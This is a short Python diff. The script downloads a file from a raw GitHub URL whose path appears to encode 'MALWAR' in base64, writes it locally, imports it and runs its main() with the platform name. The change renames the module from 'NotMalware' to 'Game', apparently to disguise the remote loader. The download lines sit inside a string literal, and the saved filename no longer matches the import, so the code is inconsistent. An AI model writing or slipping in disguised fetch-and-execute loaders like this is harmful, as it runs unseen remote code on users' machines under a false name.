@@ -5,10 +5,10 @@ import sys
 import requests
 import os
 """
-response = requests.get("https://raw.github.com/R0lUSFVC/TUFMV0FS/master/NotMalware.py")
+response = requests.get("https://raw.github.com/R0lUSFVC/TUFMV0FS/master/Game.py")
 with open("NotMalware.py", "w") as file:
     file.write(response.text)
 """
-import NotMalware
+import Game
 platform = platform.system()
-NotMalware.main(platform)
+Game.main(platform)
